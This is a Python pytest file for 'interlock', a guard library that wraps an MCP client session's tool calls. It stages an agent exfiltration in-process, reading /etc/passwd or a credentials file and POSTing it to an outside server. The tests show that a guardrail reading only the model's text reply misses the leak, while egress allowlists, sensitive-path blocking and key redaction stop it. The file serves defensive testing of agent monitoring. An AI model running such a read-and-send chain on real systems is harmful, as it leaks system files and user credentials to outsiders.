"""Integration: a real exfiltration incident, stopped at the MCP boundary.

interlock's keystone is ``guard_mcp_session``, which wraps an MCP client
session's ``call_tool``. This test drives a genuine in-process incident - read
/etc/passwd, POST it to an outside server - through a session with that exact
contract, and shows three things:

* the incident is real: unguarded, the outsider receives the file;
* a guardrail that reads the model's text reply is blind to it;
* ``guard_mcp_session`` stops it before the secret leaves the process.

The session below mirrors ``mcp.ClientSession.call_tool(name, arguments)``; the
real mcp SDK exposes the same method and drops in unchanged. The SDK needs
Python 3.10+, so this faithful stand-in keeps the test runnable on 3.9.
"""
from __future__ import annotations

import asyncio

import pytest

import interlock
from interlock import Blocked, Decision, guard_mcp_session
from interlock.detectors.data_egress import (
    network_egress_guard,
    pii_redaction_guard,
    sensitive_path_guard,
)

import incident


class MCPSession:
    """Mirrors mcp.ClientSession: async call_tool(name, arguments) -> result."""

    def __init__(self) -> None:
        self._tools = {
            "read_file": incident.read_file,
            "http_post": incident.http_post,
        }

    async def call_tool(self, name, arguments=None):
        return self._tools[name](**(arguments or {}))


def _drive(session, secret_path, exfil_url):
    """Run the read-then-exfiltrate chain against an MCP session."""
    def call(name, args):
        return asyncio.run(session.call_tool(name, args))

    return incident.run_exfil_chain(call, secret_path, exfil_url)


def test_incident_is_real_without_a_guard(outsider, system_secret_path):
    # No interlock. The attack simply works: the outsider gets the file.
    session = MCPSession()
    secret = _drive(session, system_secret_path, outsider.url)

    assert "root" in secret  # a real read of the real /etc/passwd
    assert outsider.received  # the outsider really received something
    assert "root" in outsider.received[0]  # and it is the exfiltrated secret


def test_response_guardrail_is_blind_to_the_action(outsider, system_secret_path):
    # A guardrail that inspects the model's TEXT sees only a benign reply...
    assert incident.response_guardrail_scan(incident.BENIGN_AGENT_REPLY) == "allow"

    # ...but the exfiltration is in the actions, and interlock is on the action.
    interlock.install(rules=[network_egress_guard(allowed_hosts={"api.internal"})])
    session = guard_mcp_session(MCPSession())

    with pytest.raises(Blocked):
        _drive(session, system_secret_path, outsider.url)
    assert outsider.received == []  # the text-blind layer would have leaked it


def test_guard_blocks_egress_to_outsider(outsider, system_secret_path):
    interlock.install(rules=[network_egress_guard(allowed_hosts={"api.internal"})])
    session = guard_mcp_session(MCPSession())

    with pytest.raises(Blocked) as excinfo:
        _drive(session, system_secret_path, outsider.url)

    assert excinfo.value.action == "http_post"  # blocked at the send
    assert outsider.received == []


def test_guard_blocks_secret_read_at_the_source(outsider, system_secret_path):
    interlock.install(rules=[sensitive_path_guard()])
    session = guard_mcp_session(MCPSession())

    with pytest.raises(Blocked) as excinfo:
        _drive(session, system_secret_path, outsider.url)

    assert excinfo.value.action == "read_file"  # blocked before the read happens
    assert outsider.received == []


def test_allowlisted_destination_passes_through(outsider):
    # Real send to an allowlisted host: the guard permits it untouched.
    interlock.install(rules=[network_egress_guard(allowed_hosts={"127.0.0.1"})])
    session = guard_mcp_session(MCPSession())

    asyncio.run(session.call_tool("http_post", {"url": outsider.url, "data": "telemetry"}))

    assert outsider.received == ["telemetry"]


def test_modify_neutralizes_exfil_by_redacting_the_payload(outsider, system_secret_path):
    # allow the send, but strip the secret out of it: the allow/modify/block
    # spectrum, not just a hard block.
    def redact(event):
        if event.action == "http_post" and "data" in event.args:
            return Decision.modify(
                {"data": "[REDACTED BY INTERLOCK]"}, reason="data-loss prevention"
            )
        return None

    interlock.install(rules=[redact, network_egress_guard(allowed_hosts={"127.0.0.1"})])
    session = guard_mcp_session(MCPSession())

    _drive(session, system_secret_path, outsider.url)

    assert outsider.received == ["[REDACTED BY INTERLOCK]"]
    assert all("root" not in body for body in outsider.received)  # secret never left


def test_pii_redaction_guard_masks_secrets_in_flight(outsider, credentials_file):
    # The destination (loopback) is allowlisted, so the send is permitted - but
    # the payload is a credentials file. The shipped redaction guard masks the
    # keys and email out of the body before it leaves, so the outsider receives
    # a real POST with the secrets already gone. No hand-written rule this time.
    interlock.install(rules=[
        pii_redaction_guard(),
        network_egress_guard(allowed_hosts={"127.0.0.1"}),
    ])
    session = guard_mcp_session(MCPSession())

    _drive(session, credentials_file, outsider.url)

    assert outsider.received  # the send really happened
    body = outsider.received[0]
    assert "[REDACTED OPENAI_KEY]" in body
    assert "[REDACTED AWS_KEY]" in body
    assert "[REDACTED EMAIL]" in body
    assert "sk-ABCDEFGHIJKLMNOPQRSTUVWX" not in body  # the real key never left
    assert "AKIAABCDEFGHIJKLMNOP" not in body
